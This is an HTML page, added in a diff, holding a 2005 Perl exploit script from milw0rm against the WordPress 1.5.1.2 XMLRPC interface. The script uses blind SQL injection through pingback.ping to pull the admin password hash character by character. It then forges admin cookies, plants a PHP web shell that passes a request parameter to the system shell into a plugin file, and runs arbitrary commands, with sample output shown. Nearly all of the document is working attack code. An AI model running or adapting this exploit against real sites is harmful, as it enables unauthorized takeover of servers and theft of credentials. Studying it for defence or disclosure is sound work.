@@ -1,0 +1,290 @@
+<html>
+<head>
+<title>Wordpress <= 1.5.1.2 xmlrpc Interface SQL Injection Exploit</title>
+<pre>
+#!/usr/bin/perl -w
+
+# sorry for the late posting, had to test it. /str0ke
+
+#################################################################
+# Wordpress 1.5.1.2 Strayhorn // XMLRPC Interface SQL Injection #
+#################################################################
+# By James Bercegay // http://www.gulftech.org/ // June 21 2005 #
+#################################################################
+# Quick and dirty proof of concept that uses the XML RPC server #
+# vulnerabilities I discovered to extract a password hash &amp; use #
+# that hash to execute shell commands on the server as httpd :) #
+#################################################################
+# Technical details of WordPress XMLRPC Interface SQL Injection #
+#################################################################
+# The vulnerability exist because all XMLRPC data is taken from #
+# the HTTP_RAW_POST_DATA variable, and never sanatized properly #
+# thus leaving the doors open for attack. Also, most if not all #
+# the functions in xmlrpc.php are vulnerable to similar attacks #
+#################################################################
+#
+# C:\Documents and Settings\James\Desktop&gt;wp.pl http://pathto/wp admin 1 &quot;id;uname -a;pwd;uptime&quot;
+# [*] Trying Host http://pathto/wp ...
+# [+] The XMLRPC server seems to be working
+# [+] Char 1 is 2
+# [+] Char 2 is 1
+# [+] Char 3 is 2
+# [+] Char 4 is 3
+# [+] Char 5 is 2
+# [+] Char 6 is f
+# [+] Char 7 is 2
+# [+] Char 8 is 9
+# [+] Char 9 is 7
+# [+] Char 10 is a
+# [+] Char 11 is 5
+# [+] Char 12 is 7
+# [+] Char 13 is a
+# [+] Char 14 is 5
+# [+] Char 15 is a
+# [+] Char 16 is 7
+# [+] Char 17 is 4
+# [+] Char 18 is 3
+# [+] Char 19 is 8
+# [+] Char 20 is 9
+# [+] Char 21 is 4
+# [+] Char 22 is a
+# [+] Char 23 is 0
+# [+] Char 24 is e
+# [+] Char 25 is 4
+# [+] Char 26 is a
+# [+] Char 27 is 8
+# [+] Char 28 is 0
+# [+] Char 29 is 1
+# [+] Char 30 is f
+# [+] Char 31 is c
+# [+] Char 32 is 3
+# [+] Host : http://pathto/wp
+# [+] User : admin
+# [+] Hash : 21232f297a57a5a743894a0e4a801fc3
+# [*] Attempting to create shell ..
+# [+] Trying filename hello.php ...
+# [+] Trying to activate hello.php ...
+# [+] Trying to execute id;uname -a;pwd;uptime ...
+# [+] Successfully executed id;uname -a;pwd;uptime
+#
+# uid=1979(gulftech) gid=500(customer) groups=500(customer)
+# FreeBSD example.com 4.10-RELEASE FreeBSD 4.10-RELEASE #0: Tue Jan 1
+# 1 22:44:03 PST 2005     james@example.com:/usr/src/sys/compile/EXAMPLE  i386
+#
+# /www/htdocs/wp/wp-admin
+# 8:07AM  up 35 days, 20:01, 1 user, load averages: 7.98, 8.24, 8.14
+#
+#################################################################
+
+use LWP::UserAgent;
+use Digest::MD5 qw(md5_hex);
+
+my $ua = new LWP::UserAgent;
+  $ua-&gt;agent(&quot;Wordpress Hash Grabber v1.0&quot; . $ua-&gt;agent);
+
+my @char = (&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;);
+
+my $host = $ARGV[0]; # The path to xmlrpc.php
+my $user = $ARGV[1]; # The target login, default wp user is admin
+my $post = $ARGV[2]; # Must be a valid pingback or part
+                                    # of an entry title, very easy to
+                                        # obtain if you know how to read :)
+my $exec = $ARGV[3]; # Command to execute
+my $pref = 'wp_';    # database prefix!
+my $hash = '';
+
+if ( !$ARGV[2] )
+{
+       die(&quot;Im Not Psychic ..\n&quot;);
+}
+
+print &quot;[*] Trying Host $host ...\n&quot;;
+
+my $res = $ua-&gt;get($host.'/xmlrpc.php');
+
+if ( $res-&gt;content =~ /XML-RPC server accepts POST requests only/is )
+{
+       print &quot;[+] The XMLRPC server seems to be working \n&quot;;
+}
+else
+{
+       print &quot;[!] Something seems to be wrong with the XMLRPC server \n &quot;;
+       # Sloppy way of debugging, remove if you want
+       open(LOG, &quot;&gt;wp_out.html&quot;); print LOG $res-&gt;content;
+       exit;
+}
+
+for( $i=1; $i &lt; 33; $i++ )
+{
+       for( $j=0; $j &lt; 16; $j++ )
+       {
+                               # oh my! :)
+                               my $sql = &quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;foobar' UNION SELECT 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 FROM &quot; . $pref . &quot;users WHERE (user_login='$user' AND MID(user_pass,$i,1)='$char[$j]')/*&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;$host/?p=$post#$post&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;admin&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&quot;;
+
+                               # Remove the content type so $HTTP_RAW_POST_DATA is
+                               # populated. php.net guys, pleeeeaaase fix this! :)
+                               my $req = new HTTP::Request POST =&gt; $host . &quot;/xmlrpc.php&quot;;
+                                  $req-&gt;content($sql);
+                                  $res = $ua-&gt;request($req);
+                              $out = $res-&gt;content;
+
+               if ( $out =~ /The pingback has already been registered/)
+               {
+                   $hash .= $char[$j];
+                   print &quot;[+] Char $i is $char[$j]\n&quot;;
+                   last;
+               }
+
+       }
+
+   if ( length($hash) &lt; 1 )
+   {
+               # Sloppy way of debugging, remove if you want
+               open(LOG, &quot;&gt;wp_out.html&quot;); print LOG $out;
+
+               print &quot;[!] $host not vulnerable? Better verify manually!\n&quot;;
+               exit;
+       }
+                               if ( $out =~ /&lt;value&gt;&lt;int&gt;0&lt;\/int&gt;&lt;\/value&gt;/)
+                               {
+                                   print &quot;[!] Invalid post information specified! \n&quot;;
+                                       exit;
+                               }
+
+                               # Probably exploitable, but not by using default SQL query. The
+                               # [0]{5} regex may be a bad idea bit ive never seen a md5 thats
+                               # got 5 0's at the very beginning of it.
+                               if ( $out =~ /different number of columns/is || $hash =~ /([0]{5})/ )
+                               {
+                                       # Sloppy way of debugging, remove if you want
+                                       open(LOG, &quot;&gt;wp_out.html&quot;); print LOG $out;
+
+                                       print &quot;[!] The database structured has been altered, check manually \n&quot;;
+                                       exit;
+                               }
+
+}
+
+# Verbose
+print &quot;[+] Host : $host\n&quot;;
+print &quot;[+] User : $user\n&quot;;
+print &quot;[+] Hash : $hash\n&quot;;
+
+# We got the hash, so we are guaranteed admin
+# even if we can not successfully execute! :)
+print &quot;[*] Attempting to create shell .. \n&quot;;
+
+# Here we md5 the passhash, as well as the host
+# in order to get the cookie hash, and the pass
+# hash values respectively.
+my $ckey = md5_hex($host);
+  $hash = md5_hex($hash);
+
+# Create the cookie used to make all admin requests
+my @cookie = ('Referer' =&gt; $host.'/wp-admin/plugins.php;','Cookie' =&gt; 'wordpressuser_'.$ckey.'='.$user.'; wordpresspass_'.$ckey.'='. $hash);
+  $res = $ua-&gt;get($host.'/wp-admin/plugin-editor.php', @cookie);
+
+# Let's get the filename from the plugin editor
+if ( $res-&gt;content =~ /&lt;strong&gt;(.*)\.php&lt;\/strong&gt;/i )
+{
+       # Seems our request went okay, and we have the filename!
+       my @list = ($1.'.php', 'hello.php', 'markdown.php', 'textile1.php');
+       my $file;
+
+       # Make it work one way or another :)
+       foreach $file (@list)
+       {
+
+               print &quot;[+] Trying filename $file ...\n&quot;;
+               $res = $ua-&gt;get($host.'/wp-admin/plugin-editor.php?file='.$file, @cookie);
+
+               if ( $res-&gt;content =~ /&lt;textarea[^&gt;]*&gt;(.*)&lt;\/textarea&gt;/is )
+               {
+                       # This is the file contents
+                       my $data = $1;
+
+                          # Quick and dirty way to fix the data recieved
+                          # so that it executes and does not cause error
+                          $data =~ s/&amp;gt;/&gt;/ig;
+                          $data =~ s/&amp;lt;/&lt;/ig;
+                          $data =~ s/&amp;quot;/&quot;/ig;
+                          $data =~ s/&amp;amp;/&amp;/ig;
+
+
+
+                       # We use the &lt;cmdout&gt; tag to make it easy to grab out command output
+                       my $add = ( $data =~ /&lt;cmdout&gt;(.*)&lt;\/cmdout&gt;/is ) ? '': '&lt;cmdout&gt;&lt;?php if ( !empty($_REQUEST[&quot;cmd&quot;]) ) passthru($_REQUEST[&quot;cmd&quot;]); ?&gt;&lt;/cmdout&gt;';
+
+                          # Adding our php code to the selected plugin
+                          $res = $ua-&gt;post($host . &quot;/wp-admin/plugin-editor.php&quot;, ['newcontent' =&gt; $add.$data, 'action' =&gt; 'update', 'file' =&gt; $file, 'submit' =&gt; 'foobar'], @cookie);
+
+                          # Trying to activate the plugin. If the requests doesn't succeed
+                          # then the command execution will fail unless the plugin has had
+                          print &quot;[+] Trying to activate $file ... \n&quot;;
+                          $res = $ua-&gt;get($host.'/wp-admin/plugins.php?action=activate&amp;plugin='.$file , @cookie);
+
+                          # Depending on the plugin this should execute
+                          # our command, else we try the file directly!
+                          # this works everytime on the default install
+                          print &quot;[+] Trying to execute $exec ... \n&quot;;
+                      $res = $ua-&gt;get($host.'/wp-admin/plugins.php?cmd='.$exec, @cookie);
+
+                          # It seems we have executed our command successfully
+                          if ( $res-&gt;content =~ /&lt;cmdout&gt;(.*)&lt;\/cmdout&gt;/is )
+                          {
+                                  # Send results to STDOUT
+                              print &quot;[+] Successfully executed $exec\n\n\n&quot;;
+                                  print $1;
+                                  exit;
+                          }
+                          else
+                          {
+                                  # No luck with that particular method, so
+                                  # we will try to access the modified file
+                                  print &quot;[!] Couldnt execute command $exec\n&quot;;
+                                  open(LOG, &quot;&gt;wp_out.html&quot;); print LOG $res-&gt;content;
+
+                                  # Trying to access the file directly and execute
+                                  print &quot;[!] Trying to access $file directly!\n&quot;;
+                                  $res = $ua-&gt;get($host.'/wp-content/plugins/'.$file.'?cmd='.$exec, @cookie);
+
+                                   # It seems we have executed our command successfully
+                                  if ( $res-&gt;content =~ /&lt;cmdout&gt;(.*)&lt;\/cmdout&gt;/is )
+                                  {
+                                          # Send results to STDOUT
+                                  print &quot;[+] Successfully executed $exec\n\n\n&quot;;
+                                      print $1;
+                                          exit;
+                                  }
+                                  else
+                                  {
+                                          # No luck, better take a look at things manually
+                                      print &quot;[!] Couldnt execute command $exec\n&quot;;
+                                          print &quot;[*] Try $host/wp-content/plugins/$file manually\n&quot;;
+                                  }
+                          }
+               }
+               else
+               {
+                       # Unable to get the file contents
+                       print &quot;[!] Could not read file $file \n&quot;;
+                       open(LOG, &quot;&gt;wp_out.html&quot;); print LOG $res-&gt;content . $file;
+               }
+
+       }
+
+}
+else
+{
+       # Unable to get the plugin information
+       print &quot;[!] Could Not Get Plugin Information\n&quot;;
+       open(LOG, &quot;&gt;wp_out.html&quot;); print LOG $res-&gt;content;
+}
+
+# fin
+exit;
+
+# milw0rm.com [2005-06-30]
+</pre>
+</html>
+
